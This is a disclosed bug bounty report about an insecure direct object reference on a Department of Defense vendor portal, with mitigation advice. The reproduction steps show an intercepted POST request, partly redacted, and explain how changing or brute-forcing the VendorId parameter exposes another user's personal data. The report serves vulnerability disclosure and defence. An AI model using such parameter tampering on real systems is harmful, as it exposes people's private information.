# IDOR leaking PII data via VendorId parameter

## Report Details
- **Report ID**: 1690044
- **URL**: https://hackerone.com/reports/1690044
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-09-02T20:43:55.324Z
- **Disclosed**: 2022-10-14T13:24:18.024Z

## Reporter
- **Username**: 696e746c6f6c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Dear DoD,

I found one bug on your domain from Hack US program:  █████
It's IDOR bug. Make sure to know that I didn't test many funcs here for IDOR. I didn't test for ATO (Account Takeover). But you should fix this.
 Here's the PoC:

██████████

Thank you DoD!

## Impact

An attacker could steal users information via IDOR and use it for phishing and more stuff maybe it can lead to ATOs (Accounts Takeovers).

## System Host(s)
███

## Affected Product(s) and Version(s)
Users  are affected.

## CVE Numbers


## Steps to Reproduce
1. Go to  ███████
2.  Make two accounts one attacker and one victim account.
3. Login as attacker account account. 
4. Go to my companies.
5. Scroll down there and you will see company contacts.
6. Click edit then turn your foxy proxy on and open your burp suit and save so you can intercept request.
7. Intercept your request. The request should look like this:

```javascript
POST /█████████/Vendor/Company/Contacts/SavePOC HTTP/1.1
Host: ███████
Cookie: .AspNetCore.Antiforgery.wZhPOrJ1UhI=; TS014b77bb=; .AspNetAuth=; .AspNetCore.Mvc.CookieTempDataProvider=; ASP.NET_SessionId=; TS0144f203=; CSRF-TOKEN=; .AspNetCore.Session=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: */*
Accept-Language: hr,hr-HR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 647
Origin: https://██████████
Referer: █████████████/Vendor/Company/Profile/129111
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

EditPOCvm.Email=attacker@gmail.com&EditPOCvm.PositionTitleIds=10&EditPOCvm.Title=Pentester&EditPOCvm.FirstName=attacking&EditPOCvm.MiddleName=test&EditPOCvm.LastName=wearehackerone&EditPOCvm.PhoneNumber=13333333333333339&EditPOCvm.LanguageId=&EditPOCvm.Password=&EditPOCvm.ConfirmPassword=&userId=0&passChange=&EditPOCvm.PersonProfileId=&EditPOCvm.CitizenshipId=101&VendorId=<your id>&VendorPersonProfileId=<your id>&__RequestVerificationToken=&IsAdmin=false&X-Requested-With=XMLHttpRequest
```
8. Send request in repeater tab ( i will show that request in my PoC video)
9. Change VendorId parameter to victims VendorId parameter. 
10. You will get victims some information.
11. Also you need to login as victim too and intercept request if you want victims vendorId or brute force it.

## Suggested Mitigation/Remediation Actions
Web-applications should validate all untrusted input received with every HTTP request. Your applications should perform whitelist validation on each input, verifying that the incoming value meets your applications’ expectations pertaining to:
    Minimum or maximum length
Minimum or maximum bounds for numeric values
Acceptable characters
Data Types like string, date, integer, or rational
Set membership
Pattern such as phone number, social security, or employer ID
Using whitelist validation, also called Syntactic Validation, your applications will impose checks, such as the ones above, on each input  that must be satisfied, otherwise it is rejected. Whitelist checks merely certify the content of inputs instead of trying to decipher the meaning behind them.
Your tech teams can leverage Syntactic Validation with Logical Validation by adding checks to see if the input values make sense. Logical validation takes into account the meaning behind reference value and ensures values are consistent with design intent. For example:
    An “id” parameter may represent a customer identifier. Using logical validation, it may be checked to ensure authorized access by the user.
An “account” parameter may represent a user’s account. Using logical validation, it may be verified that the information displayed is that of the specific user’s.
Using Indirect References
Another way to combat IDORs is to design resources such as ids, names, and keys to be replaced with cryptographically strong random values. These values will correspond to the original values, and both are housed on the server so an application cannot expose a direct reference. These indirect references provide a more complex counter-attack methodology than logical validation, making it more difficult for hackers to substitute meaningful values for references.
Therefore, indirect references are the preferred strategy concerning sensitive information like loan and social security numbers. However, indirect references also make your website performance slightly worse since they influence the design of the site.
Access Control Checks
Access control checks ensure data is provided only to authorized users. Features of access control include:
    Instance-based security competencies which specify access control lists associated with domain objects.
Resource values in session and on submit are checked at a timed interval with stored values on the server.
Database checks to ensure information is authentic.
How To Implement IDOR Safeguards
The IDOR designs present vulnerabilities that allow hackers to potentially access personal information via substituted resources. In order to protect against a data breach at your company it’s important to implement syntactic and logical validation, indirect references, and access control checks. These safeguards require deep knowledge of your internal server and will therefore likely need to be executed by internal employees or long-term contractors.
In order to make sure your developers has the necessary skills to keep validations, references, and checks up-to-date and secure, your technology professionals need continuous and expert training. Try some of Avatao’s practical and hands-on exercises to help safeguard against IDORs!
guide



## Attachments
No attachments
